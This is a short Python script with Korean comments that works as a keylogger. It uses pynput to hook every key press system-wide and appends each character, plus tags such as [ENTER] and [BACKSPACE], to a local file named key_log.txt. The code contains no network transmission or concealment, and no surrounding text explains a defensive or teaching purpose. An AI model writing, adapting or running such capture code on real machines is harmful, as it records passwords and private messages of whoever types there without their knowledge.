from pynput import keyboard

LOG_FILE = "key_log.txt"

def mykeystroke(key):
    try:
        if 32 <= ord(key.char) <= 126:  # 일반 문자 키
            write_log(key.char)
    except AttributeError:
        if key == keyboard.Key.enter:
            write_log("[ENTER]\n")
        elif key == keyboard.Key.space:
            write_log(" ")
        elif key == keyboard.Key.backspace:
            write_log("[BACKSPACE]")
        elif key == keyboard.Key.tab:
            write_log("[TAB]")
        else:
            write_log(f"[{key.name.upper()}]")  # 그 외 특수키

def write_log(char):
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(char)

def run():
    with keyboard.Listener(on_press=mykeystroke) as listener:
        listener.join()

if __name__ == "__main__":
    run()
